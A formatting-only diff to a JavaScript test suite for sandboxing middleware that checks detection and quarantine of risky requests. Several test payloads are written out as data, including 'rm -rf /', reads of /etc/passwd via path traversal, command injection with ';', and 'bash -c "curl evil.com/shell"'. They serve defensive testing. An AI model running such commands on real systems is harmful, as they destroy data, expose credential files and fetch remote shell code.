@@ -17,7 +17,7 @@ import {
   initializeSandboxing,
   monitorNetworkAccess,
   monitorMemoryAllocation,
-  sandboxStats
+  sandboxStats,
 } from '../../server/middleware/sandboxing.js';
 
 describe('Sandboxing System', () => {
@@ -66,7 +66,7 @@ describe('Sandboxing System', () => {
         .set('User-Agent', 'curl/7.68.0')
         .send({
           code: 'eval(malicious_code); system("rm -rf /")',
-          path: '../../etc/passwd'
+          path: '../../etc/passwd',
         });
 
       expect(highRiskResponse.headers['x-sandbox-risk']).toMatch(/high|critical/);
@@ -94,9 +94,7 @@ describe('Sandboxing System', () => {
       // Create a large buffer (> 10MB)
       const largeBuffer = Buffer.alloc(11 * 1024 * 1024, 'a');
 
-      const response = await request(app)
-        .post('/upload')
-        .attach('file', largeBuffer, 'large.txt');
+      const response = await request(app).post('/upload').attach('file', largeBuffer, 'large.txt');
 
       // Should either block or flag as high risk
       expect(response.status).toBeOneOf([403, 200]);
@@ -151,24 +149,20 @@ describe('Sandboxing System', () => {
 
   describe('Violation Detection', () => {
     it('should detect file system violations', async () => {
-      const response = await request(app)
-        .post('/test')
-        .send({
-          path: '../../etc/passwd',
-          operation: 'read_file'
-        });
+      const response = await request(app).post('/test').send({
+        path: '../../etc/passwd',
+        operation: 'read_file',
+      });
 
       expect(response.status).toBe(200);
       expect(response.headers['x-sandbox-session']).toBeDefined();
     });
 
     it('should detect command injection attempts', async () => {
-      const response = await request(app)
-        .post('/test')
-        .send({
-          command: 'cat /etc/passwd; rm -rf /',
-          action: 'execute'
-        });
+      const response = await request(app).post('/test').send({
+        command: 'cat /etc/passwd; rm -rf /',
+        action: 'execute',
+      });
 
       expect(response.status).toBe(200);
       expect(response.headers['x-sandbox-session']).toBeDefined();
@@ -176,19 +170,13 @@ describe('Sandboxing System', () => {
 
     it('should escalate risk on multiple violations', async () => {
       // First violation
-      await request(app)
-        .post('/test')
-        .send({ path: '/etc/passwd' });
+      await request(app).post('/test').send({ path: '/etc/passwd' });
 
       // Second violation
-      await request(app)
-        .post('/test')
-        .send({ command: 'rm -rf /' });
+      await request(app).post('/test').send({ command: 'rm -rf /' });
 
       // Third violation - should escalate
-      const response = await request(app)
-        .post('/test')
-        .send({ network: 'http://localhost:22' });
+      const response = await request(app).post('/test').send({ network: 'http://localhost:22' });
 
       expect(response.status).toBe(200);
     });
@@ -196,8 +184,7 @@ describe('Sandboxing System', () => {
 
   describe('Admin Endpoints', () => {
     it('should return sandbox status', async () => {
-      const response = await request(app)
-        .get('/api/admin/security/sandbox/status');
+      const response = await request(app).get('/api/admin/security/sandbox/status');
 
       expect(response.status).toBe(200);
       expect(response.body.sandbox).toBe('ACTIVE');
@@ -211,8 +198,7 @@ describe('Sandboxing System', () => {
       await request(app).get('/test');
       await request(app).post('/test').send({ data: 'test' });
 
-      const response = await request(app)
-        .get('/api/admin/security/sandbox/sessions');
+      const response = await request(app).get('/api/admin/security/sandbox/sessions');
 
       expect(response.status).toBe(200);
       expect(response.body.history).toBeDefined();
@@ -220,8 +206,7 @@ describe('Sandboxing System', () => {
     });
 
     it('should return quarantined sessions', async () => {
-      const response = await request(app)
-        .get('/api/admin/security/sandbox/quarantine');
+      const response = await request(app).get('/api/admin/security/sandbox/quarantine');
 
       expect(response.status).toBe(200);
       expect(response.body.quarantined).toBeDefined();
@@ -229,12 +214,10 @@ describe('Sandboxing System', () => {
     });
 
     it('should allow configuration updates', async () => {
-      const response = await request(app)
-        .post('/api/admin/security/sandbox/config')
-        .send({
-          isolationLevel: 'maximum',
-          maxExecutionTime: 3000
-        });
+      const response = await request(app).post('/api/admin/security/sandbox/config').send({
+        isolationLevel: 'maximum',
+        maxExecutionTime: 3000,
+      });
 
       expect(response.status).toBe(200);
       expect(response.body.updated).toBe(true);
@@ -268,9 +251,9 @@ describe('Sandboxing System', () => {
 
     it('should handle concurrent sandboxed requests', async () => {
       const start = Date.now();
-      const promises = Array(5).fill(0).map(() =>
-        request(app).get('/test')
-      );
+      const promises = Array(5)
+        .fill(0)
+        .map(() => request(app).get('/test'));
 
       const responses = await Promise.all(promises);
       const duration = Date.now() - start;
@@ -286,8 +269,7 @@ describe('Sandboxing System', () => {
 
   describe('Security Features', () => {
     it('should prevent path traversal attacks', async () => {
-      const response = await request(app)
-        .get('/test?file=../../../etc/passwd');
+      const response = await request(app).get('/test?file=../../../etc/passwd');
 
       expect(response.status).toBe(200);
       expect(response.headers['x-sandbox-session']).toBeDefined();
@@ -307,13 +289,11 @@ describe('Sandboxing System', () => {
     });
 
     it('should quarantine sessions with critical violations', async () => {
-      const response = await request(app)
-        .post('/test')
-        .send({
-          eval: 'system("cat /etc/passwd")',
-          exec: 'rm -rf /',
-          shell: 'bash -c "curl evil.com/shell"'
-        });
+      const response = await request(app).post('/test').send({
+        eval: 'system("cat /etc/passwd")',
+        exec: 'rm -rf /',
+        shell: 'bash -c "curl evil.com/shell"',
+      });
 
       expect(response.status).toBe(200);
       expect(response.headers['x-sandbox-session']).toBeDefined();
